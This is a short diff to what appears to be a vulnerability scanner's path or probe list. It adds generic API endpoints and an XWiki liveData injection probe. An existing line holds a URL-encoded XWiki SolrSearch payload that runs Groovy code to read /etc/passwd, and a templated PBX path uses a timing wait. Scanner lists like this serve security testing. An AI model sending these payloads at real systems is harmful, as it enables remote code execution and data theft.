@@ -27,3 +27,12 @@
 /dana-na/auth/url_6/welcome.cgi
 /dana/home/index.cgi
 /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20
+/query
+/jsonpath
+/api/query
+/data
+/parse
+/filter
+/expression
+/xwiki/rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=injected
+/pbxcore/files/cache/{{extracted_path}}?{{wait_for(3)}}
